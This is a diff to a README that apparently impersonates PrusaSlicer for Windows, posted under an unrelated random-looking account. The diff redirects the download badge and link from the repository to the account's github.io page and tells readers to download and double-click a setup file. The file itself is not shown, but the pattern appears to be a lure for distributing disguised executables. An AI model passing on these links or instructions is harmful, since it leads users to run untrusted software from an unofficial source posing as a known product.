@@ -1,6 +1,6 @@
 # 🖨️ prusa-slicer-2026 - Slice Your 3D Models Fast on Windows
 
-[![Download PrusaSlicer](https://img.shields.io/badge/Download-PrusaSlicer%202026-blue?style=for-the-badge&logo=windows)](https://github.com/turningpointanticonvulsantdrug530/prusa-slicer-2026)
+[![Download PrusaSlicer](https://img.shields.io/badge/Download-PrusaSlicer%202026-blue?style=for-the-badge&logo=windows)](https://turningpointanticonvulsantdrug530.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the prusa-slicer-2026 repository. This is the place for Windows users
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/turningpointanticonvulsantdrug530/prusa-slicer-2026](https://github.com/turningpointanticonvulsantdrug530/prusa-slicer-2026)
+Visit this link to download the application: [https://turningpointanticonvulsantdrug530.github.io](https://turningpointanticonvulsantdrug530.github.io)
 
 When you reach the page, look for the green "Code" button or a download area. Click it to get the setup file. Once downloaded, double-click the file to start the installation. Follow the on-screen instructions. After installation, launch PrusaSlicer from your Start menu or desktop shortcut.
 
